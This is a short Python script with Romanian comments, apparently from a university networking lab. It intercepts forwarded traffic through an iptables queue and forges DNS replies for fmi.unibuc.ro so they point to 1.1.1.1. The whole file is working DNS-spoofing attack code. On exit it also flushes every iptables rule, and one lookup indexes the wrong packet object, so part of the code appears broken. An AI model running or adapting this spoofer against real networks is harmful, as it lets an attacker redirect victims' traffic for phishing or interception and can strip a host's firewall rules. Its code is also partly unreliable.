#!/usr/bin/env python3

from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os


def detect_and_alter_packet(packet):
    """Functie care se apeleaza pentru fiecare pachet din coada
    """
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    # daca pachetul are layer de IP, UDP si DNSRR (reply)
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(UDP) and scapy_packet.haslayer(
            DNSRR):  # daca e site-ul fmi, apelam functia care face modificari
        if packet[DNSQR].qname == b'fmi.unibuc.ro.':
            print("[Before]:", scapy_packet.summary())
            # noul scapy_packet este modificat cu functia alter_packet
            scapy_packet = alter_packet(scapy_packet)
            print("[After ]:", scapy_packet.summary())
            # extragem octetii din pachet
            octets = bytes(scapy_packet)
            # il punem inapoi in coada modificat
            packet.set_payload(octets)
    # apelam accept pentru fiecare pachet din coada
    packet.accept()


def alter_packet(packet):
    # obtinem qname sau Question Name
    qname = packet[DNSQR].qname
    # construim un nou raspuns cu reply data
    packet[DNS].an = DNSRR(rrname=qname, rdata='1.1.1.1')
    # answer count = 1
    packet[DNS].ancount = 1
    # am modificat pachetul si stergem campurile len si checksum
    # in mod normal ar trebui recalculate, dar scapy face asta automat
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # returnam pachetul modificat
    return packet


def main():
    queue = NFQ()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
        # bind trebuie să folosească aceiași coadă ca cea definită în iptables
        queue.bind(10, detect_and_alter_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()


if __name__ == '__main__':
    main()
